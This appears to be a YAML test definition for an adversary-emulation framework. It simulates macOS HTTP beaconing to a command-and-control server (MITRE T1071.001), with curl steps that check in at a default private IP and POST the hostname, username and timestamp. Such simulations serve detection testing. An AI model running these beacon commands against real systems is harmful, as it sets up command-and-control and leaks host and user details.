---
api_version: 2.0
uuid: 0b7fe907-44d3-4db0-87f9-120c1f24ba13
name: HTTP Beacon Simulation
authors:
- Claude Code
description: |
  Simulates HTTP beacon communication with C2 server
mitre:
  tactics:
  - TA0011 Command and Control
  techniques:
  - T1071 Application Layer Protocol
  subtechniques:
  - 'T1071.001 Application Layer Protocol: Web Protocols'
requirements:
  platforms:
  - os: darwin
args:
- name: c2_url
  description: C2 server HTTP URL
  type: string
  default: http://192.168.1.100:8080
- name: beacon_interval
  description: Beacon check-in interval in seconds
  type: integer
  default: 60
- name: user_agent
  description: Custom user agent for HTTP requests
  type: string
  default: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
- name: beacon_path
  description: Beacon endpoint path
  type: string
  default: /api/checkin
steps:
- name: http_beacon_request
  description: Send HTTP beacon request to C2
  inline: 'curl -s -A "{{ .Args.user_agent }}" "{{ .Args.c2_url }}{{ .Args.beacon_path }}" -w "\nHTTP Status: %{http_code}\n"'
- name: beacon_with_data
  description: Send beacon with system information
  inline: |
    curl -s -A "{{ .Args.user_agent }}" -X POST "{{ .Args.c2_url }}{{ .Args.beacon_path }}" \
      -d "hostname=$(hostname)&user=$(whoami)&timestamp=$(date +%s)" \
      -w "\nHTTP Status: %{http_code}\n"
  cleanup:
    inline: curl -s http://localhost:9999 2>/dev/null || true
tests:
- name: dry_run_test
  dry_run: true
